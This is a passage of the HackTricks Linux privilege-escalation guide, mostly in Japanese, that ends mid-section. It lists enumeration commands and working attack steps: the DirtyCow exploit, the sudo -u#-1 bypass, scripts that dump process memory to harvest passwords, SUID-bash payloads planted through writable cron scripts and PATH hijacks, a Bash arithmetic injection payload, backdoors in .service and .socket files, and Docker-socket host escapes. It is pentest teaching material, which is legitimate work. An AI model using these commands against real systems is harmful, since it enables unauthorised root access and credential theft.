# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

実行中の OS についての情報収集を始めましょう
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **have write permissions on any folder inside the `PATH`** であれば、いくつかの libraries や binaries を hijack できる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報、パスワードやAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、escalate privileges に利用できる exploit がないか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルの一覧といくつかの既に **compiled exploits** はここで見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** が見つかるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルのエクスプロイトを探すのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者上で実行、カーネル2.x向けのエクスプロイトのみチェックする)

常に**Googleでカーネルバージョンを検索**してください。お使いのカーネルバージョンが既知のエクスプロイトに記載されていることがあり、その場合はそのエクスプロイトが有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo バージョン

以下に示される脆弱な sudo バージョンに基づく:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

このvulnがどのように悪用されるかの**例**については、**smasher2 box of HTB**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御を列挙する

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいるなら、そこから脱出を試みることができます:


{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**何がマウントされ、何がアンマウントされているか**、どこでなぜを確認してください。もし何かがアンマウントされているなら、それをマウントして機密情報を確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているか**確認してください。これは、kernel exploit を使用する必要がある場合に役立ちます。使用するマシン（またはそれに類するマシン）でコンパイルすることが推奨されるためです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール状況

インストールされているパッケージやサービスの**バージョン**を確認してください。例えば古い Nagios のバージョンが存在し、privilege escalation に悪用される可能性があります…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、**openVAS**を使ってマシン内にインストールされている古い、または脆弱なソフトウェアをチェックできます。

> [!NOTE] > _これらのコマンドは大量の情報を出力し、その多くはほとんど役に立たない点に注意してください。したがって、OpenVASなどのアプリケーションで、インストールされているソフトウェアのバージョンが既知のexploitsに対して脆弱かどうかを確認することを推奨します_

## プロセス

実行されている**どのプロセス**を確認し、どのプロセスが**本来あるべき以上の特権**を持っていないかをチェックしてください（例えば tomcat が root で実行されているかもしれません）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
常に [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) を確認してください。**Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータを確認してそれらを検出します。\
また、**check your privileges over the processes binaries** を確認してください。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### プロセス監視

pspy のようなツール（[**pspy**](https://github.com/DominicBreuker/pspy)）を使ってプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されている場合や特定の条件が満たされたときにそれらを特定するのに非常に有用です。

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

### プロセスのメモリ

サーバ上の一部のサービスは **credentials in clear text inside the memory** を保存します。\
通常、他ユーザーに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常すでに root でさらに資格情報を見つけたい場合に有用です。\
ただし、**as a regular user you can read the memory of the processes you own** ことを忘れないでください。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

> [!WARNING]
> 現在ほとんどのマシンは **don't allow ptrace by default** ため、非特権ユーザーに属する他のプロセスをダンプできないことに注意してください。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルが ptrace のアクセス制御を行います:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つ限り、すべてのプロセスをデバッグできます。これは ptracing の従来の動作方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます。CAP_SYS_PTRACE 権限が必要です。
> - **kernel.yama.ptrace_scope = 3**: ptrace によるトレースはできません。一度設定すると、ptracing を有効にするには再起動が必要です。

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.

#### GDB

例えば FTP サービスのメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、各マッピング領域の**アクセス権（permissions）も表示します**。**mem** 擬似ファイルは**プロセスのメモリそのものにアクセスできるようにします**。**maps** ファイルから、どの **メモリ領域が読み取り可能か** とそれらのオフセットを把握できます。この情報を使って、**mem ファイルの該当位置にシークして、読み取り可能な領域をすべてファイルにダンプします**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリにアクセスするためのデバイスで、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます.\\
通常、`/dev/mem` は **root** と kmem グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump の linux向け

ProcDumpは、Windows向けのSysinternalsスイートにある古典的なProcDumpツールをLinux向けに再構想したものです。入手は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをdumpするには、次を使用できます：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除して、あなたが所有するプロセスをdumpできます
- Script A.5 は [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) から (root が必要)

### Process Memory からの資格情報

#### 手動の例

authenticator process が実行されていることを確認した場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプして（前のセクションを参照して、プロセスのメモリをダンプするさまざまな方法を確認してください）メモリ内のcredentialsを検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**steal clear text credentials from memory** およびいくつかの **well known files** から情報を盗みます。正常に動作させるには root 権限が必要です。

| 機能                                               | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM パスワード (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (アクティブな FTP 接続)                    | vsftpd               |
| Apache2 (アクティブな HTTP Basic Auth セッション)  | apache2              |
| OpenSSH (アクティブな SSH セッション - sudo 使用)  | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュールされた/Cron ジョブ

スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? symlinks を使う? root が使用するディレクトリに特定のファイルを作成できるか?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中に PATH が見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っている点に注意_)

この crontab 内で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを実行する場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、予期しない動作（privesc のような）を引き起こすためにこれを悪用できる可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスに続く場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も同様です）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- 典型的な脆弱パターン:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: パースされるログに攻撃者が制御するテキストを書き込み、数値に見えるフィールドに command substitution を含め末尾が数字になるようにします。算術が有効であるように、コマンドが stdout に出力しない（または出力をリダイレクトする）ようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

もし **root によって実行される cron script を変更できる**なら、簡単に shell を取得できます：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
rootが実行するscriptがあなたが完全にアクセスできる**ディレクトリ**を使用している場合、そのフォルダを削除して、あなたが管理するscriptを置いた別のディレクトリを指す**symlinkフォルダを作成する**ことが有用かもしれない。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁な cron ジョブ

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探せます。うまく利用すれば権限昇格につながるかもしれません。

例えば、**0.1秒ごとに1分間監視**し、**実行回数の少ないコマンドでソート**して最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のものも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これは開始されるすべてのプロセスを監視して一覧表示します）。

### 見えない cron ジョブ

コメントの後に**キャリッジリターンを入れる**（改行文字を含めない）ことで cron ジョブを作成でき、cron ジョブは動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、**それを変更して**サービスが**起動**、**再起動**、**停止**したときにあなたの**backdoor**を**実行**させることができます（場合によってはマシンの再起動を待つ必要があります）。\
例えば `.service` ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`**

### 書き込み可能なサービスのバイナリ

サービスによって実行されるバイナリに対して**書き込み権限**を持っている場合、それらを改変して backdoor を埋め込むことができ、サービスが再実行されると backdoor が実行されます。

### systemd PATH - Relative Paths

次のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。次のようなファイルで、**relative paths being used on service configurations**が使用されているかを検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd の PATH フォルダ内に、相対パスのバイナリと同じ名前の**実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）を実行するよう要求されると、あなたの**backdoorが実行されます**（通常、権限のないユーザーはサービスを開始/停止できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は、名前が`**.timer**`で終わる systemd ユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**はカレンダー時間イベントや単調時間イベントをネイティブにサポートしており、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit に存在するユニット（例: `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
> 単位が経過したときにアクティブ化されるユニット。引数は、サフィックスが ".timer" ではないユニット名です。指定されない場合、この値はタイマー ユニットと同じ名前でサフィックスだけ異なるサービスにデフォルトで設定されます。（上記参照。）アクティブ化されるユニット名とタイマー ユニットのユニット名は、サフィックス以外は同一名にすることが推奨されます。

したがって、この権限を悪用するには次のことが必要です:

- Find some systemd unit (like a `.service`) that is **書き込み可能なバイナリを実行している**
- Find some systemd unit that is **相対パスを実行している** and you have **書き込み権限** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unixドメインソケット (UDS) は、クライアント-サーバモデル内で同一または異なるマシン間の**プロセス間通信**を可能にします。これらは標準のUnixディスクリプタファイルを利用してコンピュータ間通信を行い、`.socket` ファイルを通じて設定されます。

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつか興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、要約するとソケットがどこでリッスンするか（AF_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）を**示します**。
- `Accept`: ブール引数を取ります。**true** の場合、**着信ごとにサービスインスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。**false** の場合、すべてのリッスンソケット自体が**起動された service ユニットに渡され**、すべての接続に対して単一のサービスユニットのみが生成されます。この値はデータグラムソケットやFIFOでは無視され、単一のサービスユニットがすべての着信トラフィックを一括して処理します。**Defaults to false**。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、リッスンする**ソケット**/FIFO がそれぞれ**作成されバインドされる前**または**後**に**実行されます**。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFO がそれぞれ**閉じられ削除される前**または**後**に**実行される**追加の**コマンド**です。
- `Service`: **着信トラフィック**時に**有効化する**`service` ユニット名を指定します。この設定は Accept=no のソケットでのみ許可されます。デフォルトはソケットと同名のサービス（サフィックスを置き換えたもの）になります。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

もし **書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**できます。そうすると、その backdoor はソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があるでしょう。**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### 書き込み可能なソケット

もし **書き込み可能なソケットを特定**できたら（ここで言っているのは設定ファイルの `.socket` ではなくUnixソケット自体のことです）、そのソケットと**通信**でき、脆弱性を突ける可能性があります。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意: **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_)。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もし socket が **HTTP リクエストに応答する** なら、それと **通信** でき、場合によっては **脆弱性を exploit する** こともあります。

### 書き込み可能な Docker socket

Docker socket は通常 `/var/run/docker.sock` にあります。これは保護すべき重要なファイルです。デフォルトでは `root` ユーザーと `docker` グループのメンバーに対して書き込み可能になっています。この socket への書き込み権を持つと privilege escalation に繋がる可能性があります。以下はこれを行う方法の内訳と、Docker CLI が利用できない場合の代替手段です。

#### **Docker CLI を使った Privilege Escalation**

もし Docker socket への書き込みアクセス権がある場合、以下のコマンドで privilege escalation が可能です:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対する root 権限でコンテナを実行することを可能にします。

#### **Docker API を直接利用する方法**

Docker CLI が利用できない場合でも、Docker ソケットは Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定すると、ホストのファイルシステムに対する root 権限でコンテナ内から直接コマンドを実行できます。

### その他

docker ソケットに対する書き込み権限がある（**グループ `docker` の一員である**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) があります。もし [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) なら、それを悪用して侵害できる可能性もあります。

docker からの脱出や権限昇格のための悪用方法の詳細は、次を確認してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) の権限昇格

`ctr` コマンドを使用できる場合、次のページを確認してください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

`runc` コマンドを使用できる場合、次のページを確認してください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **inter-Process Communication (IPC) system** で、アプリケーションが効率的に相互作用しデータを共有することを可能にします。モダンな Linux システムを念頭に設計されており、さまざまな形式のアプリケーション間通信のための堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的な IPC をサポートし、これは **強化された UNIX ドメインソケット** を彷彿とさせます。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetooth デーモンからの着信通知のシグナルが音楽プレーヤーにミュートを促すことでユーザー体験が向上します。加えて、D-Bus はリモートオブジェクトシステムもサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールの総合的なマッチング結果に基づいてメッセージの権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーは bus とのやり取りを指定し、これらの権限を利用することで権限昇格が発生する可能性があります。

そのようなポリシーの例が /etc/dbus-1/system.d/wpa_supplicant.conf にあり、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、それに対してメッセージを送受信する権限を持つことが詳細に示されています。

ユーザーやグループが指定されていないポリシーは全体に適用され、「default」コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus の通信を enumerate および exploit する方法を学ぶ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、マシンの位置を特定するのは常に興味深い。

### 汎用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセス前に検出できなかったマシン上で稼働しているネットワークサービスも必ず確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic が可能か確認してください。可能であれば、認証情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**who**であるか、どの**privileges**を持っているか、システムにどの**users**がいるか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認する:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大きな UID

